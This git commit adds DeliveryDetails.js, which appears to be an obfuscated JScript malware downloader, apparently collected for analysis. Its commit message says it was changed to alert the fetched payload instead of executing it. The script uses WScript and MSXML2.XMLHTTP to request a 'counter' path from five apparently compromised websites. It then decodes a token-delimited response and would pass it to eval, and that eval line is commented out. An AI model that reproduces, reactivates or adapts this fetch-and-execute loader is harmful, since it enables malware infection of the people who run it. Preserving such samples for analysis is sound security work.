a5a9d0da82663a81a1dc1304acfd32060beda1d7
Will G <sniper7kills@users.noreply.github.com>
2017-05-13 20:49:06 -0400

    Create DeliveryDetails.js
    Modified to alert execution instead of executing it.

---
+++ 13MAY2017/DeliveryDetails.js
@@ -0,0 +1,44 @@
+function feest() {return 'oCEZ24rSqINU6Azb4Cmh8UGTzoVkSslQqzeLSmlM1o8jJ4UXf8CL8ipeI7aXivQmMBhFkwdTdqnMIibnwERDHMW3A9SFGN1ToPK2H3dDVJhozPCpAv3yzbp9VvElJN0Goz17J4piq108zeAWgsReyVCcaKur14'};
+function grohot(hunko,b1,b2,b3) {hunko.open(b1, b2, b3);}
+function fuuu(fuu1, fuu2) {return fuu1.join(fuu2);}
+function muhter(kjg, lki) {	return kjg.split(lki);}
+function abatae(beeraa) {beeraa.send();}
+function jista(rasp){eval(rasp);}
+var fijks = "MSXML2.XMLHTTP";
+var dfs = WScript.CreateObject(fijks);
+var joshua = new Array('/', '/', 'GET', ":", 'p', '', '', '', "", '', "PILKU", 'FFFFFFFFFFFF', '');
+var x = ["freeartsnyc.org/wp-content/uploads/2017/03/","eduartfun.pl/libraries/cms/schema","lluisallullevents.com/wp-content/uploads/2017/03/","paginaprueba.dreamhosters.com/counter/counter/counter","bollenpc.be/new/administrator/components/com_menus"];
+var por = 0;
+while(true)
+{
+	if(por>=x.length)
+	{
+		break;
+	}
+	try
+	{		
+		var ghyt = true;
+		var tjkh = x[por];
+		var nami = "counter";
+		var zmei = "http://";
+		var jimk = feest();
+		grohot(dfs,joshua[1+1], zmei + tjkh + '/'+nami+'?' + jimk, !ghyt);
+		abatae(dfs);
+		var r = dfs.responseText;
+		var rima = 10 * 50;
+		var got = 50+450+rima;
+		var fontu = r.length;
+		var emisogh = 12;
+		if (r.length > 1000 && r.indexOf(jimk+'') > (2-3))
+		{
+			var guznam = fuuu(muhter(r, jimk), "a");
+			alert(guznam);
+			//jista(guznam+'');
+			break;
+		}
+	}
+	catch(e)
+	{
+	};
+	por++;
+};
